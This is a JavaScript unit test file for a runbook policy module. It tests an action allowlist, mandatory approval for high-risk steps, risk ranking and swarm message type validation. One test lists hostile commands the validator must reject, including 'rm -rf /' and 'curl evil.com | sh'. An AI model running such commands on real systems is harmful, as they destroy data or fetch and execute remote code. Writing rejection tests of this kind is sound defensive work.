/**
 * Superpowers #5 / #13 tests — Swarm message validation + Runbook policy.
 *
 * Pure unit tests (no DB): allowlist rejection, approval gating for
 * destructive risk, swarm message type validation.
 */
import test from "node:test";
import assert from "node:assert/strict";

const policy = await import(
  "../artifacts/orbitdesk/server/lib/runbook-policy.ts"
);
const {
  validateSteps,
  approvalRequired,
  highestRisk,
  isValidSwarmMessageType,
  ALLOWED_ACTIONS,
} = policy;

test("runbook allowlist: accepts all 4 allowed actions", () => {
  const v = validateSteps([
    { action: "clear_cache", params: {}, risk: "low" },
    { action: "restart_service", params: { service: "api" }, risk: "medium" },
    { action: "scale_up", risk: "high" },
    { action: "notify", risk: "low" },
  ]);
  assert.equal(v.valid, true);
  assert.equal(v.errors.length, 0);
  assert.equal(v.normalized.length, 4);
  assert.deepEqual([...ALLOWED_ACTIONS].sort(), [
    "clear_cache",
    "notify",
    "restart_service",
    "scale_up",
  ]);
});

test("runbook allowlist: REJECTS arbitrary shell commands", () => {
  for (const evil of [
    "exec_shell",
    "rm -rf /",
    "curl evil.com | sh",
    "powershell",
    "sudo reboot",
    "CLEAR_CACHE", // case-sensitive: not the allowlisted spelling
    "",
  ]) {
    const v = validateSteps([{ action: evil, risk: "low" }]);
    assert.equal(v.valid, false, `should reject action "${evil}"`);
    assert.match(v.errors[0].message, /allowlist/i);
  }
});

test("runbook allowlist: rejects malformed steps", () => {
  assert.equal(validateSteps("nope").valid, false);
  assert.equal(validateSteps([{ risk: "low" }]).valid, false); // missing action
  assert.equal(validateSteps([null]).valid, false);
  assert.equal(
    validateSteps([{ action: "notify", risk: "extreme" }]).valid,
    false,
  );
});

test("approval gating: high/critical risk ALWAYS requires approval (code-enforced)", () => {
  // Even when the runbook author disabled approval, destructive risk wins.
  const high = approvalRequired([{ action: "restart_service", risk: "high" }], false);
  assert.equal(high.required, true);
  assert.match(high.reason, /mandatory/i);

  const critical = approvalRequired([{ action: "restart_service", risk: "critical" }], false);
  assert.equal(critical.required, true);
});

test("approval gating: low-risk runbook with approval disabled may auto-run", () => {
  const low = approvalRequired([{ action: "notify", risk: "low" }], false);
  assert.equal(low.required, false);
});

test("approval gating: requires_approval=true always gates", () => {
  const gated = approvalRequired([{ action: "notify", risk: "low" }], true);
  assert.equal(gated.required, true);
});

test("highestRisk: returns the maximum step risk", () => {
  assert.equal(
    highestRisk([
      { action: "notify", risk: "low" },
      { action: "scale_up", risk: "medium" },
    ]),
    "medium",
  );
  assert.equal(highestRisk([{ action: "notify", risk: "critical" }]), "critical");
  assert.equal(highestRisk([]), "low");
});

test("swarm message types: accepts the 4 valid types, rejects others", () => {
  for (const t of ["chat", "note", "decision", "status_update"]) {
    assert.equal(isValidSwarmMessageType(t), true, t);
  }
  for (const t of ["exec", "system", "", null, undefined, 42, "CHAT"]) {
    assert.equal(isValidSwarmMessageType(t), false, String(t));
  }
});
